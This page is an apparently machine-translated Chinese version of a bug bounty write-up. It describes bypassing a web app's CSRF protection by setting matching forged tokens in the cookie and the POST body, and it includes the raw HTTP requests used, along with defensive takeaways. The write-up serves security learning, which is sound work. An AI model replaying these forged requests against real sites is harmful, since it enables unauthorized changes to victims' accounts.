<html>
<head>
<title>Bug Bounty: Let’s Bypass an entire Web App’s CSRF protection</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Bug Bounty:让我们绕过整个网络应用的CSRF保护</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/bug-bounty-lets-bypass-an-entire-web-app-s-csrf-protection-friend-link-b69c43e9dcf7?source=collection_archive---------2-----------------------#2020-07-30">https://infosecwriteups.com/bug-bounty-lets-bypass-an-entire-web-app-s-csrf-protection-friend-link-b69c43e9dcf7?source=collection_archive---------2-----------------------#2020-07-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="e4ab" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">CSRF令牌并不总是足够的</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/1cbfb74e01aae6091cb1af188a796bc7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*VVzE9o3rn_Xp3kUW"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">照片由<a class="ae kv" href="https://unsplash.com/@lazycreekimages?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">迈克尔·泽兹奇</a>在<a class="ae kv" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄</figcaption></figure><p id="27c3" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">大家好，</p></div><div class="ab cl ls lt hu lu" role="separator"><span class="lv bw bk lw lx ly"/><span class="lv bw bk lw lx ly"/><span class="lv bw bk lw lx"/></div><div class="ij ik il im in"><p id="73e5" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">我希望你这段时间过得很好。我决定写一些有趣的bug bounty文章来帮助新手找到他们的第一个bug。</p><p id="8dd3" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">今天我想谈谈我在一个私人的臭虫奖励项目中发现的一个臭虫。它包括绕过公司Web应用程序的整个csrf保护系统。</p><p id="aa36" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">因为这是一个私人的臭虫奖励计划，让我们假设我们的目标是https://redacted.com。</p><p id="c015" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">现在，当我编辑我的账户设置时，我总是寻找CSRF。保存我的帐户设置时，我会收到这样的请求:</p><pre class="kg kh ki kj gt lz ma mb mc aw md bi"><span id="851e" class="me mf iq ma b gy mg mh l mi mj">POST /User/Edit?status=success HTTP/1.1<br/>Host: redacted.com<br/>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 303<br/>Origin: https://redacted.com<br/>Connection: close<br/>Referer: https://redacted.com/User/Edit?status=success<br/>Cookie: Cookie: _ga=value; _gid=value; _fbp=value; _hjid=value; session=value; countryCode=value; regionCode=04; current_page=%2FUser%2FEdit%3Fstatus%3Dsuccess; banner-covid19-dismissed=1; last_page=%2FUser%2FEdit; csrf=1j2wjowidwdne; _uetsid=value; _uetvid=value<br/>Upgrade-Insecure-Requests: 1</span><span id="d043" class="me mf iq ma b gy mk mh l mi mj">originalEditLogin=email@email.com&amp;originalEditUsername=Test+Pentester+CSRF&amp;userid=userid&amp;avatarImageID=&amp;uniqueUsername=testpentester&amp;editUsername=Test+Pentester+CSRF+test&amp;Ecom_BillTo_Online_Email_Login_Edit=email@email.com&amp;editPassword=&amp;editPassword2=&amp;latitude=&amp;longitude=&amp;csrf=1j2wjowidwdne</span></pre><p id="b36e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">目前看来一切正常，但是试着看看饼干。你会注意到那里有一个<code class="fe ml mm mn ma b">csrf</code>值；最重要的是，它在POST数据中具有与csrf令牌相同的值。听起来不错…</p><p id="21b4" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">为什么cookie中有POST数据的重复csrf令牌？如果令牌是在服务器端验证的，这就没有意义了。但是如果令牌是在客户端验证的呢？</p><p id="cd30" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">我尝试用另一个令牌值(比如说<code class="fe ml mm mn ma b">customtoken123</code>)来更改cookie和post数据参数中的csrf值。请求看起来像这样:</p><pre class="kg kh ki kj gt lz ma mb mc aw md bi"><span id="9e9c" class="me mf iq ma b gy mg mh l mi mj">POST /User/Edit?status=success HTTP/1.1<br/>Host: redacted.com<br/>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 303<br/>Origin: https://redacted.com<br/>Connection: close<br/>Referer: https://redacted.com/User/Edit?status=success<br/>Cookie: Cookie: _ga=value; _gid=value; _fbp=value; _hjid=value; session=value; countryCode=value; regionCode=04; current_page=%2FUser%2FEdit%3Fstatus%3Dsuccess; banner-covid19-dismissed=1; last_page=%2FUser%2FEdit; csrf=<!-- -->customtoken123<!-- -->; _uetsid=value; _uetvid=value<br/>Upgrade-Insecure-Requests: 1</span><span id="6120" class="me mf iq ma b gy mk mh l mi mj">originalEditLogin=email@email.com&amp;originalEditUsername=Test+Pentester+CSRF&amp;userid=userid&amp;avatarImageID=&amp;uniqueUsername=testpentester&amp;editUsername=Test+Pentester+CSRF+test&amp;Ecom_BillTo_Online_Email_Login_Edit=email@email.com&amp;editPassword=&amp;editPassword2=&amp;latitude=&amp;longitude=&amp;csrf=<!-- -->customtoken123</span></pre><p id="317d" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">并且，当我转发这个的时候，得到了成功的回复，哇！</p><p id="2ba6" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">这是因为，应用程序检查POST数据和cookie中的令牌是否具有相同的值。因此，令牌没有经过服务器端验证。这种特殊的CSRF攻击通过会话固定被命名为CSRF。这个名字是由于利用它的方式:您首先使用会话固定攻击将cookie值中的<code class="fe ml mm mn ma b">csrf</code>令牌更改为例如<code class="fe ml mm mn ma b">tok_1234</code>，然后让受害者执行如下POST请求:</p><pre class="kg kh ki kj gt lz ma mb mc aw md bi"><span id="5221" class="me mf iq ma b gy mg mh l mi mj">POST / HTTP/1.1</span><span id="0b48" class="me mf iq ma b gy mk mh l mi mj">originalEditLogin=email@email.com&amp;originalEditUsername=Test+Pentester+CSRF&amp;userid=userid&amp;avatarImageID=&amp;uniqueUsername=testpentester&amp;editUsername=Test+Pentester+CSRF+test&amp;Ecom_BillTo_Online_Email_Login_Edit=email@email.com&amp;editPassword=&amp;editPassword2=&amp;latitude=&amp;longitude=&amp;csrf=<!-- -->tok_1234</span></pre><h1 id="0936" class="mo mf iq bd mp mq mr ms mt mu mv mw mx jw my jx mz jz na ka nb kc nc kd nd ne bi translated">外卖食品</h1><ul class=""><li id="f9b9" class="nf ng iq ky b kz nh lc ni lf nj lj nk ln nl lr nm nn no np bi translated">如果有csrf保护，并不意味着webapp不容易受到csrf的攻击</li><li id="fa8d" class="nf ng iq ky b kz nq lc nr lf ns lj nt ln nu lr nm nn no np bi translated">寻找csrf时，请务必查看cookies</li></ul><p id="8e7a" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">希望你喜欢这篇文章，并继续关注更多有趣的BugBounty技巧和文章。</p></div></div>    
</body>
</html>